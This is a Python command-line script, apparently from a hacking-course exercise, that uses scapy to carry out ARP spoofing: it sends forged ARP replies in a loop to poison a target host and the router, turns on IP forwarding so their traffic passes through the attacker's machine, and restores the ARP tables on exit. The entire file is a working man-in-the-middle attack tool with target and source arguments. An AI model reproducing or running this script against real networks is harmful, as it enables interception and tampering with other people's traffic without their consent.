#! /usr/bin/env python

import subprocess
import scapy.all as scapy
import argparse
import time

def get_mac (ip):
    arp_request = scapy.ARP(pdst=ip)
    ether_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_request = ether_broadcast/arp_request
    response_packets_list = scapy.srp(arp_broadcast_request, timeout=1, verbose=False)[0]
    return response_packets_list[0][1].hwsrc

def restore(target_IP, source_IP):
    answer_packet = scapy.ARP(op=2, pdst=target_IP, hwdst=f"{get_mac(target_IP)}",
                              hwsrc=f"{get_mac(source_IP)}", psrc=source_IP)
    #print(answer_packet.show())
    scapy.send(answer_packet, count=6, verbose=False)
def spoof (target_IP, source_IP):
    answer_packet = scapy.ARP(op=2, pdst=target_IP, hwdst=f"{get_mac(target_IP)}", psrc=source_IP)
    #print(answer_packet.show())
    scapy.send(answer_packet, verbose=False)
def getArg():
    argument = argparse.ArgumentParser()
    argument.add_argument("-t", "--target", dest="Target_IP", help="[?] Input target IP")
    argument.add_argument("-s", "--source", dest="Source_IP", help="[?] Input source IP. Example: Router IP")
    return argument.parse_args()
def start():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    num_of_sent_packets = 0
    try:
        while True:
            num_of_sent_packets += 2
            spoof(getArg().Target_IP, getArg().Source_IP)  # source govorit targetu, chto on ispolzuet moi mac(kali)
            spoof(getArg().Source_IP, getArg().Target_IP)  # target govorit sourcy, chto on ispolzuet moi mac(kali)
            print(f"\r[+]Sent [{num_of_sent_packets}] packets", end='')
            time.sleep(2)
    except KeyboardInterrupt:
        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        restore(getArg().Target_IP, getArg().Source_IP)
        restore(getArg().Source_IP, getArg().Target_IP)

if __name__ == '__main__':
    # target_IP ="192.168.100.8" #TARGET_IP
    # source_IP = "192.168.100.1" #SOURCE_IP
    start()





